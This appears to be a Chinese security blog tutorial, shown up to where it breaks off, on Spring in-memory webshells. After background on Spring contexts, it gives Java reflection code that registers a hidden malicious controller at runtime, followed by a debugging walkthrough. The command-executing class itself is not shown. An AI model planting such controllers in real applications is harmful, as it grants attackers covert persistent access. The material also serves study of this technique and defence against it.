# Java安全之Spring内存马
## 基础知识
### Bean
`bean` 是 Spring 框架的一个核心概念，它是构成应用程序的主干，并且是由 `Spring IoC` 容器负责实例化、配置、组装和管理的对象。
通俗来讲：
  * bean 是对象
  * bean 被 IoC 容器管理
  * Spring 应用主要是由一个个的 bean 构成的
### ApplicationContext
Spring 框架中，`BeanFactory` 接口是 `Spring` IoC容器 的实际代表者。
从下面的`接口继承关系图`中可以看出，`ApplicationContext` 接口继承了 `BeanFactory`
接口，并通过继承其他接口进一步扩展了基本容器的功能。
因此，`org.springframework.context.ApplicationContext`接口也代表了 `IoC容器`
，它负责实例化、定位、配置应用程序中的对象(`bean`)及建立这些对象间(`beans`)的依赖。
`IoC容器`通过读取配置元数据来获取对象的实例化、配置和组装的描述信息。配置的零元数据可以用`xml`、`Java注解`或`Java代码`来表示。
实现思路：
  1. 使用纯 java 代码来获得当前代码运行时的上下文环境(Conetxt)；
  2. 使用纯 java 代码在上下文环境中手动注册一个 controller；
  3. controller中RequestMapping的方法中写入 Webshell 逻辑，达到和 Webshell 的 URL 进行交互回显的效果；
### ContextLoaderListener 与 DispatcherServlet
主要看一下ContextLoaderListener，DispatcherServlet在之前分析Thymeleaf的SSTI的时候就做了相关的分析
下面是一个典型 Spring 应用的 `web.xml` 配置示例：
    http://www.w3.org/2001/XMLSchema-instance"
             xmlns="http://java.sun.com/xml/ns/javaee"
             xsi:schemaLocation="http://java.sun.com/xml/ns/javaee http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd"
             version="2.5">
        HelloSpringMVC
            contextConfigLocation
            /WEB-INF/applicationContext.xml
            org.springframework.web.context.ContextLoaderListener
            dispatcherServlet
            org.springframework.web.servlet.DispatcherServlet
                contextConfigLocation
                /WEB-INF/dispatcherServlet-servlet.xml
            1
            dispatcherServlet
            /
关于 `Root Context` 和 `Child Context` 的重要概念：
  * Spring 应用中可以同时有多个 `Context`，其中只有一个 `Root Context`，剩下的全是 `Child Context`
  * 所有`Child Context`都可以访问在 `Root Context`中定义的 `bean`，但是`Root Context`无法访问`Child Context`中定义的 `bean`
  * 所有的`Context`在创建后，都会被作为一个属性添加到了 `ServletContext`中
### ContextLoaderListener
`ContextLoaderListener` 主要被用来初始化全局唯一的`Root Context`，即 `Root
WebApplicationContext`。这个 `Root WebApplicationContext` 会和其他 `Child Context`
实例共享它的 `IoC 容器`，供其他 `Child Context` 获取并使用容器中的 `bean`。
回到 `web.xml` 中，其相关配置如下：
        contextConfigLocation
        /WEB-INF/applicationContext.xml
        org.springframework.web.context.ContextLoaderListener
依照规范，当没有显式配置 `ContextLoaderListener` 的 `contextConfigLocation` 时，程序会自动寻找
`/WEB-INF/applicationContext.xml`，作为配置文件，所以其实上面的 ``
标签对其实完全可以去掉。
`DispatcherServlet` 初始化完成后，会创建一个普通的 `Child Context` 实例。
每个具体的 `DispatcherServlet` 创建的是一个 `Child Context`，代表一个独立的 `IoC 容器`；而
`ContextLoaderListener` 所创建的是一个 `Root Context`，代表全局唯一的一个公共 `IoC 容器`。
果要访问和操作 `bean` ，一般要获得当前代码执行环境的`IoC 容器` 代表者 `ApplicationContext`。
## Spring Controller内存马实现
### 获取Context
_所有的_`Context` _在创建后，都会被作为一个属性添加到了_ `ServletContext` _中_
LandGrey师傅文中给出了4种获取当前上下文的思路
第一种：getCurrentWebApplicationContext()
    // getCurrentWebApplicationContext方法获得的是一个XmlWebApplicationContext实例类型的Root WebApplicationContext。
    WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();
第二种：WebApplicationContextUtils
    // 通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦
    WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());
第三种：RequestContextUtils
    // 通过 ServletRequest 类的实例来获得 Child WebApplicationContext
    WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());
第四种：getAttribute
    // 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext
    WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute("org.springframework.web.servlet.DispatcherServlet.CONTEXT", 0);
先来看第一种获取方式，这里Spring环境为`5.2.3.RELEASE`，该版本下的并没有`getCurrentWebApplicationContext`方法，找的是`findWebApplicationContext`方法作为替代。
源码如下,可以看出`WebApplicationContext`是`DispatcherServlet`类的属性`WEB_APPLICATION_CONTEXT_ATTRIBUTE`
    @Nullable
    public static WebApplicationContext findWebApplicationContext(HttpServletRequest request, @Nullable ServletContext servletContext) {
        WebApplicationContext webApplicationContext = (WebApplicationContext)request.getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE);
        if (webApplicationContext == null) {
            if (servletContext != null) {
                webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(servletContext);
            }
            if (webApplicationContext == null) {
                webApplicationContext = ContextLoader.getCurrentWebApplicationContext();
            }
        }
        return webApplicationContext;
    }
    @Nullable
    public static WebApplicationContext findWebApplicationContext(HttpServletRequest request) {
        return findWebApplicationContext(request, request.getServletContext());
    }
那么跟进`DispatcherServlet`类中，`WebApplicationContext`是在`doService`方法中进行初始化的，`doService`方法则是初始化一些全局属性之后进入`doDispatch`方法处理`Request`和`Response`
### 注册Controller
Spring 2.5 开始到 Spring 3.1 之前一般使用  
`org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping`  
映射器 ；
Spring 3.1 开始及以后一般开始使用新的  
`org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping`  
映射器来支持@Contoller和@RequestMapping注解。
### 调试分析
代码如下，使用的su18师傅的思路，通过获取RequestMappingHandlerMapping父类的MappingRegistry属性并调用register方法来注册恶意的Controller
    @Controller
    public class AddControllerMemshell {
        @RequestMapping(value = "/addcontroller")
        public void addController(HttpServletRequest request, HttpServletResponse response) throws Exception{
            final String controllerPath = "/zh1z3ven";
            WebApplicationContext context = RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes) RequestContextHolder.currentRequestAttributes()).getRequest());
            RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
            Field f = mapping.getClass().getSuperclass().getSuperclass().getDeclaredField("mappingRegistry");
            f.setAccessible(true);
            Object mappingRegistry = f.get(mapping);
            Class c = Class.forName("org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry");
            Method[] ms = c.getDeclaredMethods();
            Field field = c.getDeclaredField("urlLookup");
            field.setAccessible(true);
            Map urlLookup = (Map) field.get(mappingRegistry);
            for (String urlPath : urlLookup.keySet()) {
                if (controllerPath.equals(urlPath)) {
                    response.getWriter().println("controller url path exist already");
                    return;
                }
            }
            PatternsRequestCondition url       = new PatternsRequestCondition(controllerPath);
            RequestMethodsRequestCondition condition = new RequestMethodsRequestCondition();
            RequestMappingInfo info      = new RequestMappingInfo(url, condition, null, null, null, null, null);
            Class myClass = Util.getClass(CONTROLLER_CMDMEMSHELL_CLASS_STRING);
            for (Method method : ms) {
                if ("register".equals(method.getName())) {
                    method.setAccessible(true);
                    method.invoke(mappingRegistry, info, myClass.newInstance(), myClass.getMethods()[0]);
                    response.getWriter().println("spring controller add");
                }
            }
        }
    }
在`WebApplicationContext context =
RequestContextUtils.findWebApplicationContext(((ServletRequestAttributes)
RequestContextHolder.currentRequestAttributes()).getRequest());`代码处下断点跟进，首先是通过`RequestContextHolder.currentRequestAttributes()`方法拿到`Request`的封装类`RequestFacade`对象
强转为`ServletRequestAttributes`类型后调用`getRequest`方法拿到当前的Request对象
之后作为参数进入到`findWebApplicationContext`方法（Spring环境为`5.2.3.RELEASE`，该版本下并没有`getCurrentWebApplicationContext`方法，找的是`findWebApplicationContext`方法作为替代）
`findWebApplicationContext`方法源码如下,可以看出`WebApplicationContext`是`DispatcherServlet`类的属性`WEB_APPLICATION_CONTEXT_ATTRIBUTE`
    @Nullable
    public static WebApplicationContext findWebApplicationContext(HttpServletRequest request, @Nullable ServletContext servletContext) {
        WebApplicationContext webApplicationContext = (WebApplicationContext)request.getAttribute(DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE);
        if (webApplicationContext == null) {
            if (servletContext != null) {
                webApplicationContext = WebApplicationContextUtils.getWebApplicationContext(servletContext);
            }
            if (webApplicationContext == null) {
                webApplicationContext = ContextLoader.getCurrentWebApplicationContext();
            }
        }
        return webApplicationContext;
    }
    @Nullable
    public static WebApplicationContext findWebApplicationContext(HttpServletRequest request) {
        return findWebApplicationContext(request, request.getServletContext());
    }
0x01 获取上下文  
那么跟进`DispatcherServlet`类中，`WebApplicationContext`是在`doService`方法中进行初始化的，`doService`方法则是初始化一些全局属性之后进入`doDispatch`方法处理`Request`和`Response`
回头看`findWebApplicationContext`方法，获取到的是一个`XmlWebApplicationContext`实例类型的 `Root
WebApplicationContext`
0x02 获取RequestMappingHandlerMapping
关于RequestMappingHandlerMapping
>
> RequestMappingHandlerMapping的作用是在容器启动后将系统中所有控制器方法的请求条件（RequestMappingInfo）和控制器方法(HandlerMethod)的对应关系注册到RequestMappingHandlerMapping
> Bean的内存中，待接口请求系统的时候根据请求条件和内存中存储的系统接口信息比对，再执行对应的控制器方法。  